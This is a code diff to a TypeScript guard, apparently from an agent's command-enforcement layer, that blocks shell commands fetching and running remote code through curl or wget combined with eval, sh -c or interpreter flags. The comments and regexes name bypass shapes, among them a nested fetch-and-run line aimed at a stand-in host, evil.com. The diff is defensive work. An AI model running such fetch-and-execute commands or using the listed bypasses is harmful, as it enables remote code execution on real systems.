@@ -87,25 +87,30 @@ export function checkRemoteExecBlock(cmdLower: string): EnforcementResult {
       /(?:^|[\s;&|])\.\s+<\(\s*\b(curl|wget)\b/.test(cmdForExecCheck)) {
     return { block: true, reason: remoteExecReason };
   }
-  // Block eval with curl/wget — always dangerous
-  if (/\beval\b.*\b(curl|wget)\b/.test(cmdForExecCheck)) {
-    return { block: true, reason: remoteExecReason };
+  // Block when curl/wget command substitution appears anywhere AND an execution primitive
+  // (eval, bash -c, sh -c, etc.) appears anywhere — order-independent.
+  // Catches: x=$(curl ...); eval "$x", eval "$x"; x=$(curl ...), etc.
+  const hasCurlSub = /(?:\$\(|`).*?\b(curl|wget)\b/.test(cmdForExecCheck) || /\b(curl|wget)\b.*?(?:\$\(|`)/.test(cmdForExecCheck);
+  if (hasCurlSub) {
+    if (/\beval\b/.test(cmdForExecCheck) ||
+        /\b(?:ba|c|da|[akz]|fi|tc)?sh\s+-c\b/.test(cmdForExecCheck) ||
+        /\b(?:python[23]?|perl|ruby|node|deno|bun)\s+-[ce]\b/.test(cmdForExecCheck)) {
+      return { block: true, reason: remoteExecReason };
+    }
   }
   // Block $(curl ...) and `curl ...` UNLESS every occurrence is a safe shell variable assignment.
-  // Safe: VAR=$(curl ...), export VAR=$(curl ...), local VAR=`curl ...`
-  // Unsafe: bare $(curl), --flag=$(curl), echo =$(curl), env VAR=$(curl) cmd
+  // Safe: VAR=$(curl ...), export VAR=$(curl ...) — only when followed by ; && || or end-of-string
+  // Unsafe: bare $(curl), --flag=$(curl), VAR=$(curl ...) cmd (prefix assignment runs cmd)
   if (/\$\(\s*\b(curl|wget)\b/.test(cmdForExecCheck) || /`\s*\b(curl|wget)\b/.test(cmdForExecCheck)) {
     // Block env VAR=$(curl ...) cmd — env runs a command with the var, so curl output could influence execution
     // Note: [a-z_] without /i is fine — cmdLower (the parameter) is already lowercased
     if (/\benv\s+.*[a-z_]\w*=(?:\$\(|`).*\b(curl|wget)\b/.test(cmdForExecCheck)) {
       return { block: true, reason: remoteExecReason };
     }
-    // Strip all safe assignment patterns, then check if any $(curl)/`curl` remain.
-    // Use negative lookahead (?!\$\() to reject nested $() inside the stripped content —
-    // prevents bypass via var=$(bash -c "$(curl evil.com)")
-    // Note: [^)] stops at first unescaped ) — safe because residual is rechecked for
-    // $(curl)/`curl` patterns specifically, not bare 'curl' words
-    const safeAssignment = /(?:^|[\s;&|])(?:export\s+|declare\s+|local\s+|readonly\s+|typeset\s+)?[a-z_]\w*=(?:\$\((?:(?!\$\()[^)])*\)|`(?:(?!\$\()[^`])*`)/gi;
+    // Strip safe assignment patterns — only when followed by statement separator or end-of-string.
+    // This prevents stripping prefix assignments like VAR=$(curl ...) cmd which run cmd with the var.
+    // Use negative lookahead (?!\$\() inside $() content to reject nested command substitution.
+    const safeAssignment = /(?:^|[\s;&|])(?:export\s+|declare\s+|local\s+|readonly\s+|typeset\s+)?[a-z_]\w*=(?:\$\((?:(?!\$\()[^)])*\)|`(?:(?!\$\()[^`])*`)(?=\s*(?:$|[;&|]))/gi;
     const stripped = cmdForExecCheck.replace(safeAssignment, " ");
     if (/\$\(\s*\b(curl|wget)\b/.test(stripped) || /`\s*\b(curl|wget)\b/.test(stripped)) {
       return { block: true, reason: remoteExecReason };
